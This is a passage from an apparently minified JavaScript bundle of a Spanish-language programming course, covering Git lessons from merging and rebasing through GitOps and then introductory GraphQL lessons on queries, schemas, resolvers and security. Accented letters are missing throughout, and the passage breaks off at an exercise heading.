10 con otra cosa? Git entra en pnico.\n\n*   Git se detiene y te dice: "AUTO-MERGE FAILED".\n*   Debes abrir el archivo. Vers algo as:\n\n```text\n<<<<<<< HEAD\nCambio que estaba en main\n=======\nCambio que traigo de mi rama\n>>>>>>> feature/login\n```\n\n**T decides:** Borra las marcas extraas (`<<<<`, `====`, `>>>>`) y deja el cdigo como debe quedar. Luego haces `add` y `commit` para terminar el merge.\n\n---\n\n### Misin Junior:\n1. Desde tu rama `main`, haz merge de tu rama `feature/fondo-rojo`.\n2. Como `main` no haba cambiado, debera ser un "Fast-forward".\n3. Verifica que ahora en `main` tienes los cambios que hiciste en la otra rama.\n4. Borra la rama vieja si ya no la necesitas: `git branch -d feature/fondo-rojo`.\n',completed:!0},{id:"git-06-rebase",title:"Rebase vs. Merge",level:"semi-senior",content:`# Leccin 6: Rebase vs. Merge (Reescribiendo la Historia)

Hasta ahora has usado \`merge\` para unir ramas. Pero hay otra forma: \`rebase\`. Esta es la herramienta favorita de los puristas que aman un historial limpio.

## 1. Cul es la diferencia?
Imagina que tienes una rama \`main\` y una rama \`feature\`. Ambas han avanzado.

### Merge
*   **Qu hace:** Crea un "nudo" en la historia. Un commit especial que une las dos lneas.
*   **Resultado:** El historial es "honesto". Muestra exactamente cundo te separaste y cundo volviste. Si hay muchos merges, parece un mapa de metro complejo (Spaghetti).
*   **Comando:** \`git merge feature\`

### Rebase
*   **Qu hace:** Corta tu rama \`feature\` de donde naci, y la "pega" al final de \`main\`.
*   **Resultado:** El historial es "lineal". Parece que hiciste tus cambios *despus* de todo lo que pas en \`main\`, una secuencia perfecta.
*   **Comando:**
    \`\`\`bash
    git checkout feature
    git rebase main
    \`\`\`

## 2. La Regla de Oro del Rebase
**NUNCA hagas rebase en ramas pblicas (compartidas)!**
Rebase **reescribe la historia**. Cambia los IDs (hashes) de los commits.
*   Si fulanito tiene tu rama en su mquina y t haces un rebase y lo subes (force push), rompers el repositorio de fulanito.
*   **Uso correcto:** Haz rebase en TU rama local antes de hacer un Pull Request, para limpiar tu historia y estar al da con \`main\`.

## 3. Rebase Interactivo (\`git rebase -i\`)
La herramienta ms poderosa para limpiar tu desorden antes de compartirlo. Te permite:
*   Fusionar varios commits pequeos en uno solo (**Squash**).
*   Cambiar el orden de los commits.
*   Reescribir mensajes de commit antiguos.

Ejemplo: Convertir 5 commits tipo "wip", "fix", "typo" en un solo commit slido "feat: implementa login".

---

### Misin Semi-Senior:
En tu repo de laboratorio:
1. Crea dos ramas y haz commits en ambas.
2. En una, usa \`git rebase main\` en lugar de merge.
3. Observa cmo el historial se vuelve una lnea recta con \`git log --graph --oneline --all\`.
`,completed:!0},{id:"git-07-cherry-pick",title:"Cherry-pick",level:"semi-senior",content:`# Leccin 7: Cherry-pick (Francotirador de Commits)

A veces no quieres fusionar *toda* una rama. Solo quieres **ese** commit especfico que arregl un bug crtico.

## 1. El Concepto
\`cherry-pick\` toma un commit especfico de cualquier lugar del historial y lo aplica en tu rama actual como si fuera un cambio nuevo.

## 2. El Comando
Primero, necesitas el ID (Hash) del commit que quieres robar. Usa \`git log\`. Digamos que es \`a1b2c3d\`.

\`\`\`bash
git checkout main
git cherry-pick a1b2c3d
\`\`\`

Git copiar los cambios exactos de ese commit y crear un nuevo commit en \`main\` con el mismo mensaje (y un nuevo Hash, porque el contexto cambi).

## 3. Cundo usarlo?
*   **Hotfixes:** Arreglaste un bug en la rama \`develop\` (desarrollo), pero necesitas aplicar ese arreglo YA en \`production\` sin llevarte las funcionalidades a medio terminar. Haces cherry-pick del fix a la rama de produccin.
*   **Errores de Rama:** Hiciste un commit en la rama equivocada. Haces cherry-pick a la rama correcta y luego (opcionalmente) borras el commit de la rama original (\`git reset\`).

## 4. Riesgos
Si abusas del cherry-pick, puedes terminar con **commits duplicados** (mismo contenido, diferente ID) lo que causar conflictos confusos en el futuro. salo con moderacin.

---

### Misin Semi-Senior:
1. Crea una rama \`experimento\`.
2. Haz 3 commits diferentes en ella.
3. Vuelve a \`main\`.
4. Elige solo el *segundo* commit de \`experimento\` y trelo a \`main\` con \`cherry-pick\`.
5. Verifica que solo tienes ese cambio y no los otros dos.
`,completed:!0},{id:"git-08-conflictos-avanzados",title:"Resolucin de Conflictos Avanzada",level:"semi-senior",content:`# Leccin 8: Resolucin de Conflictos Avanzada

Los conflictos no son errores, son **decisiones que Git no puede tomar por ti**.

## 1. Anatoma de un Conflicto
Ocurre cuando dos ramas modifican **las mismas lneas del mismo archivo** de formas diferentes, o cuando uno modifica y el otro borra el archivo.

## 2. Herramientas de Merge (Merge Tools)
Resolver conflictos editando \`<<<<<<<\` a mano en Notepad es doloroso.
Configura VS Code como tu herramienta de merge:
\`\`\`bash
git config --global merge.tool vscode
\`\`\`
Cuando tengas un conflicto, VS Code te mostrar botones bonitos: "Accept Current Change", "Accept Incoming Change", "Accept Both".

## 3. "Theirs" vs "Ours"
A veces sabes que una rama tiene la razn absoluta.
*   \`--ours\`: "Lo que yo tengo en mi rama actual es lo correcto".
*   \`--theirs\`: "Lo que viene de la otra rama es lo correcto".

\`\`\`bash
git checkout --theirs archivo_conflictivo.txt
\`\`\`
*(Cuidado: Esto es destructivo para tus cambios si te equivocas).*

## 4. Abortar Misin
Si ests en medio de un merge conflictivo y te das cuenta de que es un desastre total:
\`\`\`bash
git merge --abort
\`\`\`
Esto regresa todo al estado antes de intentar el merge. Como si nada hubiera pasado.

## 5. Rerere (Reuse Recorded Resolution)
Una funcionalidad oculta y mgica de Git. Si activas \`rerere\`, Git **recordar** cmo resolviste un conflicto. Si en el futuro vuelve a ocurrir el mismo conflicto (comn en rebases largos), Git aplicar tu solucin automticamente.

---

### Misin Semi-Senior:
Fuerza un conflicto "imposible".
1. En \`main\`, borra un archivo importante.
2. En una rama, modifica ese mismo archivo.
3. Intenta hacer merge. Git te dir "deleted by us, modified by them".
4. Decide: Mantienes la eliminacin o restauras el archivo modificado? Resulvelo y termina el commit.
`,completed:!0},{id:"git-09-buenas-practicas",title:"Buenas Prcticas de Commits",level:"semi-senior",content:`# Leccin 9: Buenas Prcticas de Commits (El Arte de la Bitcora)

Un historial de Git limpio cuenta una historia. Un historial sucio es basura forense.

## 1. Commits Atmicos
Cada commit debe hacer **una sola cosa** y hacerla completa.
*    Commit Gigante: "Arregla login, cambia color del footer, aade librera de mapas y actualiza el README". (Si el mapa falla y hay que revertir, pierdes tambin el arreglo del login).
*    Commit Atmico 1: "Fix: validacin de email en login".
*    Commit Atmico 2: "Style: cambia footer a dark mode".

Si rompes algo, revertir un commit atmico es fcil y seguro.

## 2. El Mensaje Perfecto (Estndar de la Industria)
Usa el formato **Conventional Commits**.
Estructura: \`tipo(alcance): descripcin corta\`

Tipos comunes:
*   \`feat\`: Nueva funcionalidad.
*   \`fix\`: Arreglo de bug.
*   \`docs\`: Cambios en documentacin.
*   \`style\`: Formato (espacios, comas) que no afecta lgica.
*   \`refactor\`: Cambio de cdigo que no aade features ni arregla bugs (limpieza).
*   \`test\`: Aadir tests faltantes.
*   \`chore\`: Tareas de mantenimiento (actualizar dependencias).

Ejemplo: \`feat(auth): agrega botn de login con Google\`

## 3. No subas basura (\`.gitignore\`)
Nunca subas:
*   \`node_modules/\` (JAMS!)
*   Archivos \`.env\` con contraseas (Seguridad crtica).
*   Archivos de build (\`dist/\`, \`build/\`).
*   Archivos de sistema (\`.DS_Store\`, \`Thumbs.db\`).

Configura siempre un archivo \`.gitignore\` en la raz de tu proyecto.

---

### Misin Semi-Senior:
Revisa el ltimo proyecto en el que trabajaste.
1. Tienes commits tipo "cambios finales"?
2. Crea un archivo \`.gitignore\` robusto para ese tipo de proyecto (busca "gitignore generator" en Google).
3. Escribe tus prximos 5 commits usando estrictamente Conventional Commits.
`,completed:!0},{id:"git-10-git-flow",title:"Git Flow y Estrategias",level:"semi-senior",content:'# Leccin 10: Git Flow y Estrategias de Ramas\n\nTrabajar solo es fcil. Trabajar con 20 personas requiere reglas estrictas de trfico.\n\n## 1. Git Flow (El Clsico Robusto)\nDiseado por Vincent Driessen. Ideal para software con "Lanzamientos" versionados (v1.0, v1.1).\n*   **Ramas Eternas:**\n    *   `main`: Solo cdigo de produccin. Estable.\n    *   `develop`: Donde se integra todo el trabajo nuevo. Inestable.\n*   **Ramas Temporales:**\n    *   `feature/*`: Salen de `develop`, vuelven a `develop`.\n    *   `release/*`: Salen de `develop` para congelar una versin, van a `main` y `develop`.\n    *   `hotfix/*`: Salen de `main` (emergencia), vuelven a `main` y `develop`. (El nico caso donde tocas main directamente).\n\n## 2. GitHub Flow (El gil Moderno)\nIdeal para Web Apps con despliegue continuo (CI/CD) donde se sube a produccin varias veces al da.\n*   `main`: Siempre desplegable.\n*   `feature-branch`: Creas una rama para **cualquier** cosa.\n*   Haces Pull Request.\n*   Se discute, revisa y aprueba.\n*   Merge a `main` -> Despliegue automtico!\n\n## 3. Trunk Based Development\nLo que usan Google y Facebook.\n*   No hay ramas de larga duracin.\n*   Todos commitean a `main` (trunk) directamente o con ramas de vida muy corta (< 1 da).\n*   Requiere tests automticos muy fuertes para no romper todo.\n\n---\n\n### Misin Semi-Senior:\nDibuja en un papel el flujo de un `hotfix` en Git Flow:\n1. Detectan bug en Prod (`main`).\n2. Creas rama `hotfix/bug-critico` desde `main`.\n3. Arreglas.\n4. Merge a `main` (para arreglar prod).\n5. Merge a `develop` (para que el arreglo tambin est en la prxima versin).\n6. Borras la rama `hotfix`.\nEntender este "bifurcar y converger" es la clave de la gestin de releases.\n',completed:!0},{id:"git-11-pull-requests",title:"Pull Requests (GitHub)",level:"semi-senior",content:`# Leccin 11: GitHub Profesional - Pull Requests (PR)

El Pull Request es el corazn de la colaboracin moderna. No es solo "pedir permiso para fusionar", es un foro de discusin tcnica.

## 1. El Ciclo de Vida de un PR
1.  **Push:** Subes tu rama a GitHub.
2.  **Open PR:** Creas la solicitud. "Quiero meter mi rama \`feature-x\` en \`main\`".
3.  **CI Checks:** Robots automticos verifican tu cdigo (Tests, Linting). Si falla rojo, nadie revisa.
4.  **Review:** Humanos leen tu cdigo, hacen preguntas y piden cambios.
5.  **Iteracin:** Haces nuevos commits en tu rama para arreglar lo que te pidieron. El PR se actualiza solo.
6.  **Approval:** Te dan luz verde ("LGTM" - Looks Good To Me).
7.  **Merge:** Fusionas y cierras.

## 2. Cmo escribir una Descripcin de PR
Un PR vaco es una falta de respeto al revisor.
Plantilla Profesional:
*   **Resumen:** Qu hace esto?
*   **Contexto:** Por qu era necesario? (Link al ticket/issue).
*   **Screenshots/Gifs:** Si es visual, muestra el antes y despus.
*   **Pasos para probar:** Cmo puede el revisor verificar que funciona?

## 3. Draft PRs
Si no has terminado pero quieres feedback temprano, abre el PR como "Draft" (Borrador). GitHub no dejar hacer merge, pero avisa a tu equipo de que ests trabajando en ello y permite comentarios preliminares.

---

### Misin Semi-Senior:
Abre un Pull Request en un repositorio de prueba (necesitars pushear a GitHub).
Usa Markdown en la descripcin. Inserta una imagen. Menciona un problema usando \`#1\` (si existe el issue 1). Pide a un amigo (o a ti mismo con otra cuenta) que te deje un comentario.
`,completed:!0},{id:"git-12-code-review",title:"Code Review",level:"semi-senior",content:`# Leccin 12: Code Level (Code Review)

Revisar cdigo es tan importante como escribirlo. Es el filtro de calidad y la herramienta #1 de aprendizaje en equipo.

## 1. Como Revisor (Reviewer)
Tu trabajo no es encontrar errores de sintaxis (eso lo hace el linter), sino errores de diseo y lgica.
*   **S amable:** Critica al cdigo, no a la persona.
    *    "Esto est mal hecho".
    *    "Has considerado qu pasa si esta variable es null? Podra causar un crash".
*   **Prioriza:** No bloquees un PR por un espacio en blanco. Bloqualo por un fallo de seguridad o un bug crtico.
*   **Pregunta:** "No entiendo esta lnea" es un comentario vlido. Si t no lo entiendes, el cdigo no es claro.

## 2. Como Autor (Author)
*   **No te tomes nada personal:** Estn ayudando a que tu cdigo sea mejor.
*   **S tu primer revisor:** Antes de abrir el PR, lee tu propio "diff". Te sorprender cuntos errores obvios encuentras t mismo.
*   **Responde a todo:** Si aceptas un cambio, di "Hecho". Si no ests de acuerdo, explica por qu tcnicamente.

## 3. Nitpicks (Detalles menores)
Usa prefijos para aclarar la severidad:
*   \`[NIT]\` (Nitpick): "Sugerencia menor, no bloqueante (ej: cambiar nombre de variable)".
*   \`[BLOCKER]\`: "Error grave, no se puede fusionar as".
*   \`[QUESTION]\`: "Duda genuina".

---

### Misin Semi-Senior:
Busca un proyecto Open Source en GitHub. Entra a la pestaa "Pull Requests". Lee los comentarios de una revisin activa. Observa el tono, qu piden y cmo interactan. Aprende copiando el estilo de los grandes proyectos.
`,completed:!0},{id:"git-13-issues-projects",title:"Issues y Projects",level:"semi-senior",content:`# Leccin 13: Issues y Projects (Gestin en GitHub)

GitHub no es solo para cdigo. Es una herramienta completa de gestin de proyectos (Project Management).

## 1. Issues (Problemas / Tareas)
Un Issue es un ticket de trabajo. Puede ser:
*   Un reporte de Bug.
*   Una solicitud de Feature.
*   Una pregunta.

**Labels (Etiquetas):** Clasifican los issues.
*   \`bug\`: Algo est roto.
*   \`enhancement\`: Nueva funcionalidad.
*   \`good first issue\`: Ideal para juniors o contribuidores nuevos.

**Assignees:** Quin es responsable de esto?

## 2. GitHub Projects (Tableros)
Un tablero tipo Kanban (como Trello o Jira) integrado en GitHub.
Columnas tpicas:
*   **Backlog:** Todo lo que queremos hacer algn da.
*   **Todo:** Lo seleccionado para este sprint.
*   **In Progress:** Lo que se est programando ahora.
*   **Review:** En PR.
*   **Done:** Mergeado en main.

La ventaja es la **automatizacin**: Puedes configurar que cuando un PR se abra, la tarjeta se mueva sola a "In Progress", y cuando se cierre, a "Done".

## 3. Milestones (Hitos)
Agrupan issues con una fecha lmite. Ej: "Lanzamiento Beta v1.0 (30 de Julio)". Te da una barra de progreso de cunto falta para completar esa meta.

---

### Misin Semi-Senior:
Crea un "Project" en tu repositorio. Configura un tablero Kanban bsico.
Crea 3 issues con diferentes labels.
Asocia los issues al proyecto.
Mueve un issue de "Todo" a "Done" y siente la satisfaccin del deber cumplido.
`,completed:!0},{id:"git-14-ci-cd-basico",title:"CI/CD Bsico",level:"semi-senior",content:`# Leccin 14: CI/CD Bsico con GitHub Actions

El "Santo Grial" de la ingeniera moderna: Automatizar todo.
*   **CI (Continuous Integration):** Integrar cdigo frecuentemente y verificar que no rompa nada (Tests automticos).
*   **CD (Continuous Deployment):** Si los tests pasan, subir a produccin automticamente.

## 1. Qu es GitHub Actions?
Es un robot integrado en GitHub. T le das instrucciones (en archivos YAML) y l las ejecuta cuando pasa algo (un push, un PR, u horario programado).

## 2. Tu primer Workflow \`.github/workflows/main.yml\`
Un archivo simple que corre tests cada vez que alguien hace push.

\`\`\`yaml
name: CI Robot

on: [push] # Cundo correr? En cada push

jobs:
  build-and-test:
    runs-on: ubuntu-latest # Dnde correr? (Mquina virtual de Linux)
    
    steps:
    - name: Descargar cdigo
      uses: actions/checkout@v3

    - name: Instalar Node.js
      uses: actions/setup-node@v3
      with:
        node-version: 18

    - name: Instalar dependencias
      run: npm install

    - name: Correr tests
      run: npm test
\`\`\`

## 3. El resultado
Cuando subas cdigo, vers un puntito amarillo (ejecutando) al lado de tu commit en GitHub.
*    Verde: Todo bien. Tests pasaron.
*    Rojo: Rompiste algo. Recibirs un email de "Build Failed" (la vergenza pblica).

Esto impide que cdigo roto llegue a produccin (si configuras reglas para prohibir merge con rojo).

---

### Misin Semi-Senior:
Crea la carpeta \`.github/workflows\` en tu repo.
Aade un archivo \`ci.yml\` simple que solo imprima "Hola Mundo" en la consola (\`run: echo "Hola Mundo"\`).
Haz push y ve a la pestaa "Actions" en GitHub para verlo correr en vivo en los servidores de Microsoft.
`,completed:!0},{id:"git-15-estrategias-empresariales",title:"Estrategias Empresariales",level:"senior",content:`# Leccin 15: Estrategias de Git Empresarial

Cuando tu organizacin tiene 500 ingenieros, "hacer un commit" deja de ser trivial. Como Senior, diseas la arquitectura del flujo de trabajo.

## 1. Governance y Branch Policies
No puedes confiar en la buena voluntad. Debes **imponer** reglas en GitHub/GitLab.
*   **Branch Protection Rules (Main):**
    *   \`Require pull request reviews before merging\`: Mnimo 2 aprobaciones de Seniors.
    *   \`Require status checks to pass\`: Si CI falla (tests rojos, lint errors), el botn de merge se bloquea fsicamente.
    *   \`Require signed commits\`: Para auditora (GPG signatures).
*   **Codeowners:** Archivo especial \`.github/CODEOWNERS\`. Define quin es "dueo" de cada carpeta. Si tocas \`/pagos\`, automticamente se pide review al equipo \`@billing-team\`.

## 2. Trunk-Based Development a Escala
Empresas como Google o Amazon no usan Git Flow. Usan TBD.
*   **Feature Flags:** Todo va a \`main\`. Si la feature no est lista, se envuelve en un \`if (FEATURE_FLAG_X)\`. Esto permite tener cdigo "a medio hacer" en produccin sin que nadie lo vea.
*   **Deploy Trains:** El despliegue a produccin sale a horas fijas (ej: cada hora), como un tren. Si tu cdigo entr, se va. Si rompiste el tren, detienes a toda la empresa (presin social positiva).

## 3. InnerSource
Aplicar prcticas de Open Source *dentro* de la empresa.
*   Cualquier equipo puede contribuir al repositorio de otro equipo mediante PRs, en lugar de pedir que lo hagan y esperar meses.
*   Requiere documentacin excelente y tests robustos en todos los repos.

---

### Misin Senior:
Configura en un repo de GitHub una regla de proteccin para \`main\`:
1. Exige que pasen los checks de CI.
2. Exige review de Codeowners.
3. Intenta hacer un push directo a \`main\` y observa cmo te rechaza el sistema. Explica a tu equipo (imaginario) por qu esto es bueno y no burocracia.
`,completed:!0},{id:"git-16-monorepos",title:"Monorepos",level:"senior",content:`# Leccin 16: Monorepons vs. Polyrepos

Debemos tener 50 repositorios pequeos o un repositorio gigante de 10GB? La decisin arquitectnica ms divisiva.

## 1. Polyrepos (Multi-repo)
Cada microservicio o librera tiene su propio repo.
*   **Pros:** Aislamiento total. Repo pequeo y rpido. Control de acceso granular.
*   **Contras:** Infierno de dependencias. Para actualizar una librera compartida, debes hacer PR en 50 repositorios. Difcil ver cambios "cross-cutting".

## 2. Monorepo
Todo el cdigo de la empresa (Frontend, Backend, Libreras, Infra) en UN solo repo.
*   **Ejemplos:** Google, Facebook, Twitter, Uber.
*   **Pros:** Refactorizacin atmica (cambias la API y el Cliente en el mismo commit). Cdigo compartido trivial. Un solo CI.
*   **Contras:** Git se vuelve lento (necesitas herramientas especiales). Tiempos de Build eternos si no eres inteligente.
*   **Herramientas:** Turborepo, Nx, Bazel, Lerna.

## 3. Workspaces (npm/yarn/pnpm)
Cmo manejar dependencias en un Monorepo JS/TS.
*   Tienes una carpeta \`packages/ui\` y otra \`apps/web\`.
*   \`apps/web\` importa \`packages/ui\` como si fuera una librera externa, pero es un symlink local.
*   Cambias algo en \`ui\` y \`web\` lo ve al instante.

---

### Misin Senior:
Crea una estructura de Monorepo bsica con npm workspaces:
*   \`/packages/shared-utils\` (funcin suma)
*   \`/apps/api\` (usa suma)
*   \`/apps/frontend\` (usa suma)
Configura \`package.json\` para que el root instale todas las dependencias. Demuestra cmo cambiar \`shared-utils\` afecta a ambos consumidores inmediatamente.
`,completed:!0},{id:"git-17-hooks",title:"Git Hooks y Automatizacin",level:"senior",content:`# Leccin 17: Git Hooks (Automatizacin Local)

Antes de que el cdigo llegue a GitHub (CI), puedes interceptarlo en la mquina del desarrollador.

## 1. Qu son los Hooks?
Scripts que Git ejecuta automticamente antes o despus de eventos eventos como \`commit\`, \`push\`, \`merge\`.
Viven en \`.git/hooks\`.

## 2. Hooks ms usados
*   \`pre-commit\`: Se ejecuta al hacer \`git commit\`. Ideal para Linters (Prettier, ESLint). Si el cdigo est feo, el commit falla y no se guarda.
*   \`commit-msg\`: Verifica que el mensaje siga el estndar (Conventional Commits). Si escribes "fix", te rechaza.
*   \`pre-push\`: Corre los tests unitarios antes de subir al servidor.

## 3. Husky y Lint-staged
Configurar hooks a mano (bash scripts) es tedioso. En JS usamos **Husky**.
Y para que no sea lento, usamos **lint-staged**: Solo corre el linter en los archivos que *cambiaron* (staged), no en todo el proyecto.

*Configuracin tpica en package.json:*
\`\`\`json
"husky": {
  "hooks": {
    "pre-commit": "lint-staged"
  }
}
\`\`\`

---

### Misin Senior:
Instala \`husky\` en tu proyecto.
Configura un hook \`pre-commit\` que impida hacer commit si hay un \`console.log\` en el cdigo.
Intenta commitear un \`console.log\`. Si Husky te grita y detiene el commit, has logrado automatizar la calidad.
`,completed:!0},{id:"git-18-automatizacion",title:"Automatizacin Avanzada",level:"senior",content:`# Leccin 18: Automatizacin Avanzada (GH Actions Scripting)

Llevar CI/CD al siguiente nivel: Infraestructura como Cdigo y Bots.

## 1. Matrices de Estrategia
Tu librera funciona en Node 14, 16 y 18? En Linux y Windows?
No escribas 6 jobs. Usa una matriz.

\`\`\`yaml
strategy:
  matrix:
    node: [14, 16, 18]
    os: [ubuntu-latest, windows-latest]
\`\`\`
GitHub generar 6 jobs en paralelo combinando todo.

## 2. Automatizacin de Releases (Semantic Release)
Herramienta que lee tus Conventional Commits y automticamente:
1.  Calcula la nueva versin (SemVer): Fue un \`fix\`? Sube patch. Fue \`feat\`? Sube minor.
2.  Genera el CHANGELOG.md.
3.  Crea el Git Tag y Release en GitHub.
4.  Publica el paquete a npm.
Todo esto sin intervencin humana al hacer merge a \`main\`.

## 3. Bots de GitHub
Puedes programar scripts que comenten en PRs.
*   Ejemplo: Un bot que analiza el costo de la nube de tus cambios de Terraform y comenta: "Este PR aumentar la factura AWS en $50/mes".
*   Ejemplo: Un bot que felicita a los, contribuidores primerizos.

---

### Misin Senior:
Configura un Workflow que use una matriz para correr tests en Node 18 y Node 20.
Aade un paso condicional: Si el commit es en \`main\`, despliega (simulado con un echo). Si es en una rama, solo testea.
`,completed:!0},{id:"git-19-equipos-grandes",title:"Equipos Grandes (GitOps)",level:"senior",content:`# Leccin 19: Gestin de Equipos Grandes (GitOps)

Cuando el equipo crece, "pedirle a Juan que despliegue" no escala. La infraestructura debe ser declarativa y vivir en Git.

## 1. Qu es GitOps?
**Git como nica fuente de verdad para la infraestructura.**
Si quieres cambiar la CPU del servidor, no entras a la consola de AWS. Cambias un archivo YAML en Git ("infra-repo"), haces PR, y un operador (como ArgoCD o Flux) sincroniza el estado real con Git. Si alguien cambia algo manual en AWS, el operador lo revierte automticamente.

## 2. Gestin de Secretos
JAMS subas \`.env\` o keys a Git. Ni siquiera en repos privados.
*   **Solucin:** Vaults (HashiCorp Vault, AWS Secrets Manager, GitHub Secrets).
*   En Git solo subes referencias cifradas o inyectas los secretos en tiempo de CI/CD.

## 3. DORA Metrics
Para medir si tu equipo de ingeniera es de elite (Seniority Organizacional), mides 4 cosas:
1.  **Deployment Frequency:** Cuntas veces despliegas al da? (Elite: Mltiples veces).
2.  **Lead Time for Changes:** Tiempo desde el commit hasta produccin. (Elite: < 1 hora).
3.  **Change Failure Rate:** Qu % de deploys rompen algo? (Elite: < 5%).
4.  **Time to Restore Service:** Cuando se rompe, cunto tardas en arreglarlo? (Elite: < 1 hora).

Git es la fuente de datos para calcular estas mtricas.

---

### Misin Senior:
Implementa conceptualmente GitOps.
1. Tienes un repo \`app-code\` y otro \`app-config\`.
2. Simula un cambio de configuracin (ej: aumentar rplicas de 2 a 5).
3. Haz el cambio en un archivo YAML en \`app-config\`.
4. Explica cmo un sistema automatizado detectara ese commit y aplicara el cambio en el cluster sin intervencin humana.
`,completed:!0}]},g1={id:"graphql",title:"GraphQL Moderno",description:"Domina el lenguaje de consulta para APIs que est revolucionando la forma en que el Frontend y el Backend se comunican.",completed:!1,track:"Especializacin para Desarrolladores",lessons:[{id:"graphql-01-intro-graphql",title:"Qu es GraphQL y por qu existe?",level:"junior",content:`# Leccin 01: Qu es GraphQL y por qu existe?

**GraphQL** es un lenguaje de consulta para APIs y un tiempo de ejecucin para completar esas consultas con tus datos existentes. Fue creado por Facebook para solucionar los problemas de las APIs REST tradicionales.

## 1. El gran problema: Over-fetching y Under-fetching
En **REST**, el servidor decide qu datos enviarte. 
*   **Over-fetching:** Pides un usuario y el servidor te devuelve 50 campos, aunque solo necesites el nombre. Gastas datos y memoria.
*   **Under-fetching:** Pides un usuario, pero para ver sus posteos tienes que hacer OTRA peticin a \`/users/1/posts\`. Esto hace que las Apps sean lentas.

**GraphQL soluciona esto:** El cliente (el Frontend) pide exactamente lo que necesita, y nada ms.

## 2. Comparacin Rpida

| Caracterstica | REST | GraphQL |
| :--- | :--- | :--- |
| **Endpoints** | Mltiples (\`/users\`, \`/posts\`) | Uno solo (normalmente \`/graphql\`) |
| **Datos** | El servidor decide la forma | El cliente decide la forma |
| **Versiones** | \`v1\`, \`v2\`, etc. | No necesita versiones (es evolutivo) |

---

### Concepto Junior:
GraphQL no es una base de datos nueva. Es una "capa" que se pone encima de tu servidor para que pedir datos sea mucho ms eficiente y flexible para el Frontend.
`,completed:!1},{id:"graphql-02-queries-mutations",title:"Queries y Mutations - Hablando con el Servidor",level:"junior",content:`# Leccin 02: Queries y Mutations - Hablando con el Servidor

En GraphQL tenemos dos formas principales de interactuar con los datos.

## 1. Queries (Consultas)
Se usan para **leer** datos. Es el equivalente al \`GET\` de REST.
\`\`\`graphql
query {
  user(id: "123") {
    name
    email
    posts {
      title
    }
  }
}
\`\`\`
Fjate cmo pedimos el usuario y sus posts en una sola peticin. Adis al Under-fetching!

## 2. Mutations (Mutaciones)
Se usan para **modificar** datos (crear, actualizar, borrar). Equivalen a \`POST\`, \`PUT\`, \`PATCH\` y \`DELETE\`.
\`\`\`graphql
mutation {
  createPost(title: "Mi primer post", content: "Hola mundo") {
    id
    createdAt
  }
}
\`\`\`
Lo genial de las mutaciones es que puedes pedir que te devuelvan el objeto recin creado en la misma operacin.

## 3. Campos y Argumentos
Cada campo en GraphQL puede recibir argumentos (como el \`id\` en el ejemplo de arriba), lo que permite filtrar, buscar y ordenar de forma nativa.

---

### Misin Junior:
Entender que en GraphQL, la "forma" de tu peticin es idntica a la "forma" de la respuesta que vas a recibir. Si pides un nombre, recibes un objeto con la clave \`name\`.
`,completed:!1},{id:"graphql-03-schemas-tipos",title:"Schemas y el Sistema de Tipos",level:"semi-senior",content:`# Leccin 03: Schemas y el Sistema de Tipos

Como Semi-Senior, ya no solo "pides datos", ahora diseas cmo se estructuran esos datos usando el **Schema Definition Language (SDL)**.

## 1. Tipos de Objetos
El Schema es el contrato entre el cliente y el servidor. Define qu se puede preguntar.
\`\`\`graphql
type User {
  id: ID!
  username: String!
  age: Int
  posts: [Post]
}
\`\`\`
*   \`!\`: Significa que el campo es **obligatorio** (no puede ser nulo).
*   \`[Post]\`: Significa que es una **lista** de objetos tipo Post.

## 2. Los tipos raz (Root Types)
Todo Schema de GraphQL debe tener al menos un tipo \`Query\`:
\`\`\`graphql
type Query {
  me: User
  allUsers: [User]
}
\`\`\`

## 3. Strong Typing (Tipado Fuerte)
GraphQL valida los tipos automticamente. Si envas un String donde se esperaba un Int, el servidor rechazar la peticin sin que t tengas que escribir cdigo extra de validacin.

---

### Lo que hace un Semi-Senior:
Disea Schemas pensando en la usabilidad del Frontend. No copia la base de datos tal cual, sino que crea capas de abstraccin para que el API sea limpia y fcil de entender.
`,completed:!1},{id:"graphql-04-resolvers",title:"Resolvers - Donde vive la lgica",level:"semi-senior",content:`# Leccin 04: Resolvers - Donde vive la lgica

El Schema dice qu se puede pedir, pero el **Resolver** es la funcin que realmente va a buscar los datos a la DB o a otro API.

## 1. Estructura de un Resolver
Un resolver suele recibir 4 argumentos: \`(parent, args, context, info)\`.
\`\`\`javascript
const resolvers = {
  Query: {
    user: async (parent, { id }, context) => {
      // Hablamos con la base de datos
      return await db.User.findById(id);
    }
  }
};
\`\`\`

## 2. El Contexto (\`context\`)
El objeto \`context\` es compartido por todos los resolvers. Es el lugar perfecto para poner:
*   La conexin a la base de datos.
*   La informacin del usuario autenticado.

## 3. Resolvers de Campo
Puedes crear resolvers para campos especficos. Por ejemplo, si el Schema tiene un campo \`fullName\` pero en la DB solo tienes \`name\` y \`lastName\`, puedes crear un resolver que los una.

---

### Misin Semi-Senior:
Aprender que cada campo en GraphQL puede tener su propio resolver. Esto permite que los datos de un mismo objeto vengan de diferentes bases de datos o servicios sin que el cliente se de cuenta.
`,completed:!1},{id:"graphql-05-autenticacion-seguridad",title:"Autenticacin y Seguridad en GraphQL",level:"semi-senior",content:`# Leccin 05: Autenticacin y Seguridad en GraphQL

Proteger un API de GraphQL es un poco diferente a REST porque todos los "endpoints" son en realidad uno solo.

## 1. Dnde autenticar
No autentiques dentro de cada resolver.
*   **Mejor prctica:** Usa un middleware antes de llegar a GraphQL para verificar el Token (JWT). Si el usuario es vlido, lo pones en el \`context\`.
*   Luego, el resolver solo mira el \`context\` para ver si tiene permiso.

## 2. El peligro de la profundidad
En GraphQL un atacante podra enviar una consulta maliciosa pidiendo: un usuario -> sus posts -> los autores de los comentarios de esos posts -> sus posteos -> etc.
*   **Solucin:** Usa herramientas para limitar la **Query Depth** (profundidad) y evitar que el servidor colapse.

## 3. Manejo de Errores
GraphQL siempre devuelve un status \`200 OK\` si el servidor respondi, aunque haya fallado la bsqueda. Debes mirar el campo \`errors\` en la respuesta JSON para saber si algo sali mal.

---

### Verdad Tcnica:
"En GraphQL, la seguridad es granular". No solo proteges la URL, proteges el acceso a tipos de datos y campos especficos segn el rol del usuario.
`,completed:!1},{id:"graphql-06-practica-graphql",title:"Prctica y Evaluacin: GraphQL Profesional",level:"semi-senior",content:`# Prctica y Evaluacin: GraphQL Profesional

Demuestra que sabes disear y consultar APIs modernas.

---

## 1. Ejercicio Junior: Mi Primera Query
**Consigna:** Tienes un servidor de una red social. Quieres obtener tu perfil (nombre y biografa) y el ttulo de tus ltimos 3 posts en una sola peticin.
Escribe cmo se vera esa Query.

## 2. Ejercicio Semi-Senior: Diseador de Schemas
